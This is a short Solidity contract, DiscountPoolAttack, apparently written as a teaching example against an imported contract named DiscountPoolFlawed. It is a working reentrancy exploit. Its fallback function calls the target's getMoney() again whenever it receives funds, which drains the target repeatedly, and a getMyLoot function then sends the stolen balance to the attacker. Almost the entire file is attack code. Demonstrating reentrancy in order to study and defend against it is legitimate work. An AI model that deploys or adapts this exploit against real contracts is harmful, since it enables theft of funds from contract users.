pragma solidity ^0.4.4;
import "./DiscountPoolFlawed.sol";

contract DiscountPoolAttack {

    DiscountPoolFlawed discountPool;
    address owner;

    modifier only_owner { if (msg.sender != owner) {
            throw;
        }
        _;
    }

    function DiscountPoolAttack(address discountPoolAddress) {
        owner = msg.sender;
        discountPool = DiscountPoolFlawed(discountPoolAddress);
    }

    function attack() only_owner {
        discountPool.getMoney();
    }

    // fallback function
    function () payable {
        discountPool.getMoney();
    }

    function getMyLoot() only_owner {
        msg.sender.send(this.balance);
    }

}
